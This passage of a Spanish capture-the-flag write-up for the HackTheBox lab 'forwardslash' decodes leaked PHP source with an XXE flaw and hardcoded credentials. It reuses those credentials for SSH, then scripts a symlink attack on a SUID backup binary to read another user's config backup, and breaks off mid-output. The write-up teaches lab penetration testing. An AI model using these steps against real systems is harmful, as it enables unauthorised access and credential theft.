L2Zvcm0+Cgo8L2h0bWw+Cgo8IS0tIFRPRE86CkZpeCBGVFAgTG9naW4KLS0+Cgo8P3BocAppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICJHRVQiICYmIGlzc2V0KCRfR0VUWyd4bWwnXSkpIHsKCgkkcmVnID0gJy9mdHA6XC9cL1tcc1xTXSpcL1wiLyc7CgkvLyRyZWcgPSAnLygoKCgyNVswLTVdKXwoMlswLTRdXGQpfChbMDFdP1xkP1xkKSkpXC4pezN9KCgoKDI1WzAtNV0pfCgyWzAtNF1cZCl8KFswMV0/XGQ/XGQpKSkpLycKCglpZiAocHJlZ19tYXRjaCgkcmVnLCAkX0dFVFsneG1sJ10sICRtYXRjaCkpIHsKCQkkaXAgPSBleHBsb2RlKCcvJywgJG1hdGNoWzBdKVsyXTsKCQllY2hvICRpcDsKCQllcnJvcl9sb2coIkNvbm5lY3RpbmciKTsKCgkJJGNvbm5faWQgPSBmdHBfY29ubmVjdCgkaXApIG9yIGRpZSgiQ291bGRuJ3QgY29ubmVjdCB0byAkaXBcbiIpOwoKCQllcnJvcl9sb2coIkxvZ2dpbmcgaW4iKTsKCgkJaWYgKEBmdHBfbG9naW4oJGNvbm5faWQsICJjaGl2IiwgJ04wYm9keUwxa2VzQmFjay8nKSkgewoKCQkJZXJyb3JfbG9nKCJHZXR0aW5nIGZpbGUiKTsKCQkJZWNobyBmdHBfZ2V0X3N0cmluZygkY29ubl9pZCwgImRlYnVnLnR4dCIpOwoJCX0KCgkJZXhpdDsKCX0KCglsaWJ4bWxfZGlzYWJsZV9lbnRpdHlfbG9hZGVyIChmYWxzZSk7CgkkeG1sZmlsZSA9ICRfR0VUWyJ4bWwiXTsKCSRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKCSRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKCSRhcGkgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCSRyZXEgPSAkYXBpLT5yZXF1ZXN0OwoJZWNobyAiLS0tLS1vdXRwdXQtLS0tLTxicj5cclxuIjsKCWVjaG8gIiRyZXEiOwp9CgpmdW5jdGlvbiBmdHBfZ2V0X3N0cmluZygkZnRwLCAkZmlsZW5hbWUpIHsKICAgICR0ZW1wID0gZm9wZW4oJ3BocDovL3RlbXAnLCAncisnKTsKICAgIGlmIChAZnRwX2ZnZXQoJGZ0cCwgJHRlbXAsICRmaWxlbmFtZSwgRlRQX0JJTkFSWSwgMCkpIHsKICAgICAgICByZXdpbmQoJHRlbXApOwogICAgICAgIHJldHVybiBzdHJlYW1fZ2V0X2NvbnRlbnRzKCR0ZW1wKTsKICAgIH0KICAgIGVsc2UgewogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KfQoKPz4K
URL:
</code></pre></div></div>

<p>Copiamos la cadena y la desciframos en nuestra máquina:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"PD9waHAKLy9pbmNsdWRlX29uY2UgLi4vc2Vzc2lvbi5waHA7Ci8vIEluaXRpYWxpemUgdGhlIHNlc3Npb24Kc2Vzc2lvbl9zdGFydCgpOwoKaWYoKCFpc3Nld
CgkX1NFU1NJT05bImxvZ2dlZGluIl0pIHx8ICRfU0VTU0lPTlsibG9nZ2VkaW4iXSAhPT0gdHJ1ZSB8fCAkX1NFU1NJT05bJ3VzZXJuYW1lJ10gIT09ICJhZG1pbiIpIC
YmICRfU0VSVkVSWydSRU1PVEVfQUREUiddICE9PSAiMTI3LjAuMC4xIil7CiAgICBoZWFkZXIoJ0hUVFAvMS4wIDQwMyBGb3JiaWRkZW4nKTsKICAgIGVjaG8gIjxoMT4
0MDMgQWNjZXNzIERlbmllZDwvaDE+IjsKICAgIGVjaG8gIjxoMz5BY2Nlc3MgRGVuaWVkIEZyb20gIiwgJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10sICI8L2gzPiI7CiAg
ICAvL2VjaG8gIjxoMj5SZWRpcmVjdGluZyB0byBsb2dpbiBpbiAzIHNlY29uZHM8L2gyPiIKICAgIC8vZWNobyAnPG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29ud
GVudD0iMzt1cmw9Li4vbG9naW4ucGhwIiAvPic7CiAgICAvL2hlYWRlcigibG9jYXRpb246IC4uL2xvZ2luLnBocCIpOwogICAgZXhpdDsKfQo/Pgo8aHRtbD4KCTxoMT
5YTUwgQXBpIFRlc3Q8L2gxPgoJPGgzPlRoaXMgaXMgb3VyIGFwaSB0ZXN0IGZvciB3aGVuIG91ciBuZXcgd2Vic2l0ZSBnZXRzIHJlZnVyYmlzaGVkPC9oMz4KCTxmb3J
tIGFjdGlvbj0iL2Rldi9pbmRleC5waHAiIG1ldGhvZD0iZ2V0IiBpZD0ieG1sdGVzdCI+CgkJPHRleHRhcmVhIG5hbWU9InhtbCIgZm9ybT0ieG1sdGVzdCIgcm93cz0i
MjAiIGNvbHM9IjUwIj48YXBpPgogICAgPHJlcXVlc3Q+dGVzdDwvcmVxdWVzdD4KPC9hcGk+CjwvdGV4dGFyZWE+CgkJPGlucHV0IHR5cGU9InN1Ym1pdCI+Cgk8L2Zvc
m0+Cgo8L2h0bWw+Cgo8IS0tIFRPRE86CkZpeCBGVFAgTG9naW4KLS0+Cgo8P3BocAppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICJHRVQiICYmIGlzc2
V0KCRfR0VUWyd4bWwnXSkpIHsKCgkkcmVnID0gJy9mdHA6XC9cL1tcc1xTXSpcL1wiLyc7CgkvLyRyZWcgPSAnLygoKCgyNVswLTVdKXwoMlswLTRdXGQpfChbMDFdP1x
kP1xkKSkpXC4pezN9KCgoKDI1WzAtNV0pfCgyWzAtNF1cZCl8KFswMV0/XGQ/XGQpKSkpLycKCglpZiAocHJlZ19tYXRjaCgkcmVnLCAkX0dFVFsneG1sJ10sICRtYXRj
aCkpIHsKCQkkaXAgPSBleHBsb2RlKCcvJywgJG1hdGNoWzBdKVsyXTsKCQllY2hvICRpcDsKCQllcnJvcl9sb2coIkNvbm5lY3RpbmciKTsKCgkJJGNvbm5faWQgPSBmd
HBfY29ubmVjdCgkaXApIG9yIGRpZSgiQ291bGRuJ3QgY29ubmVjdCB0byAkaXBcbiIpOwoKCQllcnJvcl9sb2coIkxvZ2dpbmcgaW4iKTsKCgkJaWYgKEBmdHBfbG9naW
4oJGNvbm5faWQsICJjaGl2IiwgJ04wYm9keUwxa2VzQmFjay8nKSkgewoKCQkJZXJyb3JfbG9nKCJHZXR0aW5nIGZpbGUiKTsKCQkJZWNobyBmdHBfZ2V0X3N0cmluZyg
kY29ubl9pZCwgImRlYnVnLnR4dCIpOwoJCX0KCgkJZXhpdDsKCX0KCglsaWJ4bWxfZGlzYWJsZV9lbnRpdHlfbG9hZGVyIChmYWxzZSk7CgkkeG1sZmlsZSA9ICRfR0VU
WyJ4bWwiXTsKCSRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKCSRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKCSRhc
GkgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCSRyZXEgPSAkYXBpLT5yZXF1ZXN0OwoJZWNobyAiLS0tLS1vdXRwdXQtLS0tLTxicj5cclxuIjsKCWVjaG8gIi
RyZXEiOwp9CgpmdW5jdGlvbiBmdHBfZ2V0X3N0cmluZygkZnRwLCAkZmlsZW5hbWUpIHsKICAgICR0ZW1wID0gZm9wZW4oJ3BocDovL3RlbXAnLCAncisnKTsKICAgIGl
mIChAZnRwX2ZnZXQoJGZ0cCwgJHRlbXAsICRmaWxlbmFtZSwgRlRQX0JJTkFSWSwgMCkpIHsKICAgICAgICByZXdpbmQoJHRlbXApOwogICAgICAgIHJldHVybiBzdHJl
YW1fZ2V0X2NvbnRlbnRzKCR0ZW1wKTsKICAgIH0KICAgIGVsc2UgewogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KfQoKPz4K"</span> | <span class="nb">base64</span> <span class="nt">-d</span>
&lt;?php
//include_once ../session.php<span class="p">;</span>
// Initialize the session
session_start<span class="o">()</span><span class="p">;</span>

<span class="k">if</span><span class="o">((!</span>isset<span class="o">(</span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s2">"loggedin"</span><span class="o">])</span> <span class="o">||</span> <span class="nv">$_SESSION</span><span class="o">[</span><span class="s2">"loggedin"</span><span class="o">]</span> <span class="o">!==</span> <span class="nb">true</span> <span class="o">||</span> <span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">'username'</span><span class="o">]</span> <span class="o">!==</span> <span class="s2">"admin"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">'REMOTE_ADD
R'</span><span class="o">]</span> <span class="o">!==</span> <span class="s2">"127.0.0.1"</span><span class="o">){</span>
    header<span class="o">(</span><span class="s1">'HTTP/1.0 403 Forbidden'</span><span class="o">)</span><span class="p">;</span>
    <span class="nb">echo</span> <span class="s2">"&lt;h1&gt;403 Access Denied&lt;/h1&gt;"</span><span class="p">;</span>
    <span class="nb">echo</span> <span class="s2">"&lt;h3&gt;Access Denied From "</span>, <span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">'REMOTE_ADDR'</span><span class="o">]</span>, <span class="s2">"&lt;/h3&gt;"</span><span class="p">;</span>
    //echo <span class="s2">"&lt;h2&gt;Redirecting to login in 3 seconds&lt;/h2&gt;"</span>
    //echo <span class="s1">'&lt;meta http-equiv="refresh" content="3;url=../login.php" /&gt;'</span><span class="p">;</span>
    //header<span class="o">(</span><span class="s2">"location: ../login.php"</span><span class="o">)</span><span class="p">;</span>
    <span class="nb">exit</span><span class="p">;</span>
<span class="o">}</span>
?&gt;
&lt;html&gt;                                                                                                                           
        &lt;h1&gt;XML Api Test&lt;/h1&gt;                                                                                                    
        &lt;h3&gt;This is our api <span class="nb">test </span><span class="k">for </span>when our new website gets refurbished&lt;/h3&gt;                                                  
        &lt;form <span class="nv">action</span><span class="o">=</span><span class="s2">"/dev/index.php"</span> <span class="nv">method</span><span class="o">=</span><span class="s2">"get"</span> <span class="nb">id</span><span class="o">=</span><span class="s2">"xmltest"</span><span class="o">&gt;</span>                                                                 
                &lt;textarea <span class="nv">name</span><span class="o">=</span><span class="s2">"xml"</span> <span class="nv">form</span><span class="o">=</span><span class="s2">"xmltest"</span> <span class="nv">rows</span><span class="o">=</span><span class="s2">"20"</span> <span class="nv">cols</span><span class="o">=</span><span class="s2">"50"</span><span class="o">&gt;</span>&lt;api&gt;                                                    
    &lt;request&gt;test&lt;/request&gt;                                                                                                      
&lt;/api&gt;                                                                                                                           
&lt;/textarea&gt;                                                                                                                      
                &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"submit"</span><span class="o">&gt;</span>                                                                                            
        &lt;/form&gt;                                                                                                                  
                                                                                                                                 
&lt;/html&gt;                                                                                                                          
                                                                                                                                 
&lt;<span class="o">!</span><span class="nt">--</span> TODO:                                                                                                                       
Fix FTP Login                                                                                                                    
<span class="nt">--</span><span class="o">&gt;</span>                                                                                                                              

&lt;?php
<span class="k">if</span> <span class="o">(</span><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">'REQUEST_METHOD'</span><span class="o">]</span> <span class="o">===</span> <span class="s2">"GET"</span> <span class="o">&amp;&amp;</span> isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'xml'</span><span class="o">]))</span> <span class="o">{</span>

        <span class="nv">$reg</span> <span class="o">=</span> <span class="s1">'/ftp:\/\/[\s\S]*\/\"/'</span><span class="p">;</span>
        //<span class="nv">$reg</span> <span class="o">=</span> <span class="s1">'/((((25[0-5])|(2[0-4]\d)|([01]?\d?\d)))\.){3}((((25[0-5])|(2[0-4]\d)|([01]?\d?\d))))/'</span>

        <span class="k">if</span> <span class="o">(</span>preg_match<span class="o">(</span><span class="nv">$reg</span>, <span class="nv">$_GET</span><span class="o">[</span><span class="s1">'xml'</span><span class="o">]</span>, <span class="nv">$match</span><span class="o">))</span> <span class="o">{</span>
                <span class="nv">$ip</span> <span class="o">=</span> explode<span class="o">(</span><span class="s1">'/'</span>, <span class="nv">$match</span><span class="o">[</span>0]<span class="o">)[</span>2]<span class="p">;</span>
                <span class="nb">echo</span> <span class="nv">$ip</span><span class="p">;</span>
                error_log<span class="o">(</span><span class="s2">"Connecting"</span><span class="o">)</span><span class="p">;</span>

                <span class="nv">$conn_id</span> <span class="o">=</span> ftp_connect<span class="o">(</span><span class="nv">$ip</span><span class="o">)</span> or die<span class="o">(</span><span class="s2">"Couldn't connect to </span><span class="nv">$ip</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>

                error_log<span class="o">(</span><span class="s2">"Logging in"</span><span class="o">)</span><span class="p">;</span>

                <span class="k">if</span> <span class="o">(</span>@ftp_login<span class="o">(</span><span class="nv">$conn_id</span>, <span class="s2">"chiv"</span>, <span class="s1">'N0bodyL1kesBack/'</span><span class="o">))</span> <span class="o">{</span>

                        error_log<span class="o">(</span><span class="s2">"Getting file"</span><span class="o">)</span><span class="p">;</span>
                        <span class="nb">echo </span>ftp_get_string<span class="o">(</span><span class="nv">$conn_id</span>, <span class="s2">"debug.txt"</span><span class="o">)</span><span class="p">;</span>
                <span class="o">}</span>

                <span class="nb">exit</span><span class="p">;</span>
        <span class="o">}</span>

        libxml_disable_entity_loader <span class="o">(</span><span class="nb">false</span><span class="o">)</span><span class="p">;</span>
        <span class="nv">$xmlfile</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s2">"xml"</span><span class="o">]</span><span class="p">;</span>
        <span class="nv">$dom</span> <span class="o">=</span> new DOMDocument<span class="o">()</span><span class="p">;</span>
        <span class="nv">$dom</span>-&gt;loadXML<span class="o">(</span><span class="nv">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD<span class="o">)</span><span class="p">;</span>
        <span class="nv">$api</span> <span class="o">=</span> simplexml_import_dom<span class="o">(</span><span class="nv">$dom</span><span class="o">)</span><span class="p">;</span>
        <span class="nv">$req</span> <span class="o">=</span> <span class="nv">$api</span>-&gt;request<span class="p">;</span>
        <span class="nb">echo</span> <span class="s2">"-----output-----&lt;br&gt;</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
        <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$req</span><span class="s2">"</span><span class="p">;</span>
<span class="o">}</span>

<span class="k">function </span>ftp_get_string<span class="o">(</span><span class="nv">$ftp</span>, <span class="nv">$filename</span><span class="o">)</span> <span class="o">{</span>
    <span class="nv">$temp</span> <span class="o">=</span> fopen<span class="o">(</span><span class="s1">'php://temp'</span>, <span class="s1">'r+'</span><span class="o">)</span><span class="p">;</span>
    <span class="k">if</span> <span class="o">(</span>@ftp_fget<span class="o">(</span><span class="nv">$ftp</span>, <span class="nv">$temp</span>, <span class="nv">$filename</span>, FTP_BINARY, 0<span class="o">))</span> <span class="o">{</span>
        rewind<span class="o">(</span><span class="nv">$temp</span><span class="o">)</span><span class="p">;</span>
        <span class="k">return </span>stream_get_contents<span class="o">(</span><span class="nv">$temp</span><span class="o">)</span><span class="p">;</span>
    <span class="o">}</span>
    <span class="k">else</span> <span class="o">{</span>
        <span class="k">return </span><span class="nb">false</span><span class="p">;</span>
    <span class="o">}</span>
<span class="o">}</span>

?&gt;
</code></pre></div></div>

<p>Si ponemos ojo de lince, vemos las credenciales del usuario <strong>chiv</strong>: <code class="language-plaintext highlighter-rouge">chiv : N0bodyL1kesBack/</code>, por lo que las guardamos como siempre y vamos a tratar de ver si nos conectamos por ssh:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh chiv@10.10.10.183
The authenticity of host <span class="s1">'10.10.10.183 (10.10.10.183)'</span> can<span class="s1">'t be established.
ECDSA key fingerprint is SHA256:7DrtoyB3GmTDLmPm01m7dHeoaPjA7+ixb3GDFhGn0HM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.10.183<span class="s1">' (ECDSA) to the list of known hosts.
chiv@10.10.10.183'</span>s password: 
Welcome to Ubuntu 18.04.4 LTS <span class="o">(</span>GNU/Linux 4.15.0-91-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

  System information as of Sun Jan 23 03:09:26 UTC 2022

  System load:  0.0               Processes:             172
  Usage of /:   53.2% of 7.75GB   Users logged <span class="k">in</span>:       0
  Memory usage: 11%               IP address <span class="k">for </span>ens160: 10.10.10.183
  Swap usage:   0%


 <span class="k">*</span> Canonical Livepatch is available <span class="k">for </span>installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

15 packages can be updated.
0 updates are security updates.


Last login: Tue Mar 24 11:34:37 2020 from 10.10.14.3
chiv@forwardslash:~<span class="nv">$ </span><span class="nb">whoami
</span>chiv
chiv@forwardslash:~<span class="err">$</span>
</code></pre></div></div>

<p>Ya nos encontramos dentro de la máquina, sin embargo no podemos visualizar la flag, es necesario migrar al usuario <strong>pain</strong>; por lo que vamos a enumerar un poco el sistema:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chiv@forwardslash:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>chiv<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>chiv<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>chiv<span class="o">)</span>
chiv@forwardslash:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>chiv: 
Sorry, user chiv may not run <span class="nb">sudo </span>on forwardslash.
chiv@forwardslash:~<span class="nv">$ </span><span class="nb">cd</span> /
chiv@forwardslash:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> <span class="nt">-printf</span> <span class="s2">"%f</span><span class="se">\t</span><span class="s2">%p</span><span class="se">\t</span><span class="s2">%u</span><span class="se">\t</span><span class="s2">%g</span><span class="se">\t</span><span class="s2">%m</span><span class="se">\n</span><span class="s2">"</span> 2&gt;/dev/null | column <span class="nt">-t</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"root"</span>
at                         ./usr/bin/at                                                  daemon  daemon           6755
backup                     ./usr/bin/backup                                              pain    pain             4555
chiv@forwardslash:/<span class="err">$</span>
</code></pre></div></div>

<p>Vemos que tenemos permisos SUID sobre el recurso <code class="language-plaintext highlighter-rouge">/usr/bin/backup</code> cuyo propietario es el usuario <strong>pain</strong>, al cual necesitamos migrar para visualizar la flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chiv@forwardslash:/<span class="nv">$ </span>file /usr/bin/backup                       
/usr/bin/backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/l, <span class="k">for </span>GNU
/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>e0fcfb1c48fe0b5377774c1d237dc50ddfa41c08, not stripped                                               
chiv@forwardslash:/<span class="nv">$ </span>strings /usr/bin/backup
/lib64/ld-linux-x86-64.so.2                                     
SwwL                                                            
libcrypto.so.1.1                                                                                                                 
_ITM_deregisterTMCloneTable                                                                                                      
__gmon_start__                                                                                                                   
_ITM_registerTMCloneTable                                                                                                        
MD5_Final                                                                                                                        
MD5_Init                                                                                                                         
MD5_Update                                                                                                                       
libc.so.6                                                                                                                        
setuid                                                                                                                           
sprintf                                                                                                                          
fopen                                                                                                                            
puts                                                            
__stack_chk_fail                                                                                                                 
putchar                                                                                                                          
fgetc                                                                                                                            
strlen                          
fclose                          
malloc                                                          
remove                          
getgid                                                          
getuid                          
localtime                     
__cxa_finalize                  
access                          
setgid            
__libc_start_main               
snprintf                 
OPENSSL_1_1_0     
GLIBC_2.4               
GLIBC_2.2.5                     
dH34%<span class="o">(</span>                                                          
AWAVI                                                           
AUATL                                                                                                                            
<span class="o">[]</span>A<span class="se">\A</span><span class="o">]</span>A^A_
<span class="nt">----------------------------------------------------------------------</span>                                                           
       Pain<span class="s1">'s Next-Gen Time Based Backup Viewer                                                                                  
       v0.1                                                                                                                      
       NOTE: not reading the right file yet,                                                                                     
       only works if backup is taken in same second                                                                              
----------------------------------------------------------------------                                                           
%02x                                                                                                                             
%02d:%02d:%02d                                                                                                                   
Current Time: %s                                                                                                                 
File cannot be opened.
ERROR: %s Does Not Exist or Is Not Accessible By Me, Exiting...
;*3$"
GCC: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7696
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
backup.c
__FRAME_END__
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__init_array_end
__init_array_start
_DYNAMIC
getgid@@GLIBC_2.2.5
__libc_csu_fini
snprintf@@GLIBC_2.2.5
__gmon_start__
puts@@GLIBC_2.2.5
banner
putchar@@GLIBC_2.2.5
malloc@@GLIBC_2.2.5
fopen@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
setuid@@GLIBC_2.2.5
_IO_stdin_used
strlen@@GLIBC_2.2.5
_ITM_registerTMCloneTable
__data_start
MD5_Final@@OPENSSL_1_1_0
MD5_Update@@OPENSSL_1_1_0
__cxa_finalize@@GLIBC_2.2.5
sprintf@@GLIBC_2.2.5
fgetc@@GLIBC_2.2.5
__TMC_END__
str2md5
__dso_handle
__libc_csu_init
__bss_start
__stack_chk_fail@@GLIBC_2.4
MD5_Init@@OPENSSL_1_1_0
getuid@@GLIBC_2.2.5
fclose@@GLIBC_2.2.5
remove@@GLIBC_2.2.5
access@@GLIBC_2.2.5
_edata
localtime@@GLIBC_2.2.5
setgid@@GLIBC_2.2.5
main
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
chiv@forwardslash:/$
</span></code></pre></div></div>

<p>Vamos a ejecutarlo a ver que pasa:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chiv@forwardslash:/<span class="nv">$ </span>./usr/bin/backup
<span class="nt">----------------------------------------------------------------------</span>
       Pain<span class="s1">'s Next-Gen Time Based Backup Viewer
       v0.1
       NOTE: not reading the right file yet, 
       only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 03:21:51
ERROR: ffd55d85b11899cdf4ebc2a452464aeb Does Not Exist or Is Not Accessible By Me, Exiting...
chiv@forwardslash:/$
</span></code></pre></div></div>

<p>Vemos que tratar de leer un archivo cuyo nombre es un hash; si lo ejecutamos varias veces rápido, vemos que el hash es el mismo para la misma hora y luego cambia para otra hora:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chiv@forwardslash:~<span class="nv">$ </span>backup
<span class="nt">----------------------------------------------------------------------</span>
       Pain<span class="s1">'s Next-Gen Time Based Backup Viewer
       v0.1
       NOTE: not reading the right file yet, 
       only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 03:31:28
ERROR: ef8ad1cd8f4a916d511d3727fe81170d Does Not Exist or Is Not Accessible By Me, Exiting...
chiv@forwardslash:~$ backup
----------------------------------------------------------------------
       Pain'</span>s Next-Gen Time Based Backup Viewer
       v0.1
       NOTE: not reading the right file yet, 
       only works <span class="k">if </span>backup is taken <span class="k">in </span>same second
<span class="nt">----------------------------------------------------------------------</span>

Current Time: 03:31:29
ERROR: 0cf8ab1e44af6ff87c6aeb7b84a52d4e Does Not Exist or Is Not Accessible By Me, Exiting...
chiv@forwardslash:~<span class="nv">$ </span>backup
<span class="nt">----------------------------------------------------------------------</span>
       Pain<span class="s1">'s Next-Gen Time Based Backup Viewer
       v0.1
       NOTE: not reading the right file yet, 
       only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 03:31:29
ERROR: 0cf8ab1e44af6ff87c6aeb7b84a52d4e Does Not Exist or Is Not Accessible By Me, Exiting...
chiv@forwardslash:~$ backup
----------------------------------------------------------------------
       Pain'</span>s Next-Gen Time Based Backup Viewer
       v0.1
       NOTE: not reading the right file yet, 
       only works <span class="k">if </span>backup is taken <span class="k">in </span>same second
<span class="nt">----------------------------------------------------------------------</span>

Current Time: 03:31:29
ERROR: 0cf8ab1e44af6ff87c6aeb7b84a52d4e Does Not Exist or Is Not Accessible By Me, Exiting...
chiv@forwardslash:~<span class="err">$</span>
</code></pre></div></div>

<p>Por lo tanto, vamos a crearnos un script que nos ayude a generar un archivo cuyo nombre sea el hash del script <code class="language-plaintext highlighter-rouge">backup</code> y luego ejecutamos <code class="language-plaintext highlighter-rouge">backup</code> para ver que pasa.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chiv@forwardslash:~<span class="nv">$ </span><span class="nb">touch </span>script.sh
chiv@forwardslash:~<span class="nv">$ </span><span class="nb">chmod</span> +x script.sh
chiv@forwardslash:~<span class="nv">$ </span>nano script.sh 
chiv@forwardslash:~<span class="nv">$ </span><span class="nb">cat </span>script.sh 
<span class="c">#!/bin/bash</span>

<span class="nb">hash</span><span class="o">=</span><span class="si">$(</span>backup | <span class="nb">grep</span> <span class="s2">"ERROR"</span> | <span class="nb">awk</span> <span class="s1">'{print $2}'</span><span class="si">)</span>
<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[*] Nombre del archivo: </span><span class="nv">$hash</span><span class="s2">"</span>
<span class="nb">echo</span> <span class="s2">"Esto es una prueba"</span> <span class="o">&gt;</span> <span class="nv">$hash</span>
<span class="nb">ls</span> <span class="nt">-l</span><span class="p">;</span> <span class="nb">echo
</span>backup
chiv@forwardslash:~<span class="err">$</span>
</code></pre></div></div>

<p>Vamos a ejecutar nuestro script:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chiv@forwardslash:~<span class="nv">$ </span>./script.sh 

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Nombre del archivo: 561644aeceda2787bb3c874d51cef017
total 8
<span class="nt">-rw-rw-r--</span> 1 chiv chiv  19 Jan 23 03:36 561644aeceda2787bb3c874d51cef017
<span class="nt">-rwxrwxr-x</span> 1 chiv chiv 157 Jan 23 03:36 script.sh

<span class="nt">----------------------------------------------------------------------</span>
       Pain<span class="s1">'s Next-Gen Time Based Backup Viewer
       v0.1
       NOTE: not reading the right file yet, 
       only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 03:36:54
Esto es una prueba
chiv@forwardslash:~$ ls -l
total 4
-rwxrwxr-x 1 chiv chiv 157 Jan 23 03:36 script.sh
chiv@forwardslash:~$
</span></code></pre></div></div>

<p>Vemos que nos lee el contenido de nuestro archivo, así que podríamos tratar de encontar archivos cuyo propietario sea <strong>pain</strong> y ver su contenido con el binario <code class="language-plaintext highlighter-rouge">backup</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chiv@forwardslash:/<span class="nv">$ </span>find <span class="se">\-</span><span class="nb">type </span>f <span class="nt">-user</span> pain 2&gt;/dev/null
./var/backups/config.php.bak
./usr/bin/backup
./home/pain/.profile
./home/pain/user.txt
./home/pain/.bashrc
./home/pain/.bash_logout
./home/pain/encryptorinator/encrypter.py
./home/pain/encryptorinator/ciphertext
./home/pain/note.txt
chiv@forwardslash:/<span class="err">$</span>
</code></pre></div></div>

<p>Tenemos el recurso <code class="language-plaintext highlighter-rouge">/var/backups/config.php.bak</code>, el cual por el nombre podría contener credenciales; asi que vamos a modificar un poco el script para que ahora en vez de meterle contenido, vamos a crear un link simbólico hacia <code class="language-plaintext highlighter-rouge">/var/backups/config.php.bak</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="nb">hash</span><span class="o">=</span><span class="si">$(</span>backup | <span class="nb">grep</span> <span class="s2">"ERROR"</span> | <span class="nb">awk</span> <span class="s1">'{print $2}'</span><span class="si">)</span>
<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[*] Nombre del archivo: </span><span class="nv">$hash</span><span class="s2">"</span>
<span class="nb">ln</span> <span class="nt">-s</span> /var/backups/config.php.bak <span class="nv">$hash</span>
<span class="nb">ls</span> <span class="nt">-l</span><span class="p">;</span> <span class="nb">echo
</span>backup
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chiv@forwardslash:~<span class="nv">$ </span>./script.sh 

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Nombre del archivo: fc0bfacd0c65bd1afa9f7f35a02a6e05
total 4
lrwxrwxrwx 1 chiv chiv  27 Jan 23 03:40 fc0bfacd0c65bd1afa9f7f35a02a6e05 -&gt; /var/backups/config.php.bak
